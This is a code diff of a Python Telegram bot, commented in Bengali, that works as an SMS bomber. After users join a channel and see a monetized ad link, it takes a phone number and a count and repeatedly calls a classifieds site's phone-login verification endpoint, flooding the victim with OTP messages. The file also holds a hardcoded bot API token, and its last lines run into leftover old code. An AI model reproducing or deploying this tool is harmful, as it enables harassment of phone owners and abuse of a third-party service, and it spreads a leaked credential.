@@ -5,18 +5,18 @@ from telebot import types
 from flask import Flask
 from threading import Thread
 
-# ১. সেটিংস
+# ১. সেটিংস ও টোকেন
 API_TOKEN = '8678067992:AAEDkPkmtuz86YnrMJcnIVcp19tL52tkyRk'
 CHANNEL_USERNAME = '@developer_of_maruf' 
 
-# আপনার দেওয়া লিঙ্কগুলো
-GPLINK_URL = "https://gplinks.co/MyyC" 
-SECRET_CODE = "MARUF70" # এটি আপনার Pubnotepad-এ লিখে রাখুন
+# আপনার দেওয়া লিঙ্ক (ব্যানার হিসেবে কাজ করবে)
+# ইউজার এই লিঙ্কে ক্লিক করলে আপনার ইনকাম হবে
+AD_LINK = "https://gplinks.co/s1LKKm" 
 
 bot = telebot.TeleBot(API_TOKEN)
-user_status = {} # ইউজারের ভেরিফিকেশন চেক করার জন্য
+user_data = {}
 
-# ২. Render সচল রাখার সার্ভার
+# ২. Render সচল রাখার জন্য Flask সার্ভার
 app = Flask('')
 @app.route('/')
 def home(): return "Bot is Running!"
@@ -31,10 +31,72 @@ def check_join(chat_id):
         return status in ['member', 'administrator', 'creator']
     except: return False
 
-# ৩. স্টার্ট কমান্ড
+# ৩. স্টার্ট কমান্ড (এখানেই ব্যানার অ্যাড দেখাবে)
 @bot.message_handler(commands=['start'])
 def welcome(message):
     chat_id = message.chat.id
+    if check_join(chat_id):
+        # ব্যানার মেসেজ (ছবি ছাড়া বাটন স্টাইল ব্যানার)
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("🎁 আজকের স্পেশাল গিফট (ক্লিক)", url=AD_LINK))
+        
+        bot.send_message(
+            chat_id, 
+            "✅ ভেরিফিকেশন সফল!\n\nনিচের বাটনে ক্লিক করে আমাদের আজকের অফারটি দেখে নিন।\n\nএখন SMS পাঠাতে নিচের বক্সে নাম্বারটি লিখুন:", 
+            reply_markup=markup
+        )
+        bot.register_next_step_handler(message, get_number)
+    else:
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/developer_of_maruf"))
+        markup.add(types.InlineKeyboardButton("🔄 Verify Done", callback_data="verify_join"))
+        bot.send_message(chat_id, "❌ আগে আমাদের চ্যানেলে জয়েন করুন!", reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: call.data == "verify_join")
+def verify_join(call):
+    if check_join(call.message.chat.id):
+        bot.delete_message(call.message.chat.id, call.message.message_id)
+        welcome(call.message)
+    else:
+        bot.answer_callback_query(call.id, "❌ জয়েন হননি!", show_alert=True)
+
+# ৪. নাম্বার ও বোম্বিং লজিক
+def get_number(message):
+    # যদি ইউজার ভুলে অন্য কিছু লিখে
+    if message.text == "/start":
+        welcome(message)
+        return
+
+    if not message.text or not message.text.isdigit() or len(message.text) < 11:
+        msg = bot.send_message(message.chat.id, "❌ সঠিক ১১ ডিজিটের নাম্বার দিন (যেমন: 017xxxxxxxx):")
+        bot.register_next_step_handler(msg, get_number)
+        return
+    
+    user_data[message.chat.id] = message.text
+    msg = bot.send_message(message.chat.id, "🔢 কতটি SMS পাঠাতে চান? (সর্বোচ্চ ১০০)")
+    bot.register_next_step_handler(msg, send_bomber)
+
+def send_bomber(message):
+    try:
+        amount = int(message.text)
+        if amount > 100: amount = 100 # লিমিট সেট করে দেওয়া হলো
+        
+        chat_id = message.chat.id
+        num = user_data[chat_id]
+        
+        bot.send_message(chat_id, f"🚀 {num} নাম্বারে {amount}টি SMS পাঠানো হচ্ছে...")
+        
+        # অ্যাটাক লুপ
+        for i in range(amount):
+            requests.get(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={num}", timeout=5)
+            
+        bot.send_message(chat_id, "✅ কাজ শেষ! আবার পাঠাতে /start লিখুন।")
+    except:
+        bot.send_message(message.chat.id, "❌ শুধু সংখ্যা লিখুন।")
+
+if __name__ == "__main__":
+    keep_alive()
+    bot.infinity_polling(timeout=10, long_polling_timeout=5)    chat_id = message.chat.id
     if check_join(chat_id):
         markup = types.InlineKeyboardMarkup()
         markup.add(types.InlineKeyboardButton("🔓 বোট আনলক করুন (ক্লিক)", url=GPLINK_URL))
